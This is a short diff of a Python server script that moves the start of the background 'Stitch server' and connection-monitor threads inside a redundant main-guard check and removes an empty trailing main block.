@@ -1963,13 +1963,15 @@ if __name__ == '__main__':
 
     build_tools_status = check_build_tools()
 
-    # Start Stitch server in background
-    stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
-    stitch_thread.start()
-    
-    # Start connection monitor
-    monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
-    monitor_thread.start()
+    # Start background threads only when running as main
+    if __name__ == '__main__':
+        # Start Stitch server in background
+        stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
+        stitch_thread.start()
+        
+        # Start connection monitor
+        monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
+        monitor_thread.start()
     
     # Configure debug mode - default to False for security
     debug_mode = os.getenv('STITCH_DEBUG', 'false').lower() in ('true', '1', 'yes')
@@ -2020,7 +2022,3 @@ if __name__ == '__main__':
             use_reloader=False,
             log_output=True
         )
-
-if __name__ == '__main__':
-    # Run the server
-    pass  # The server setup is already done above
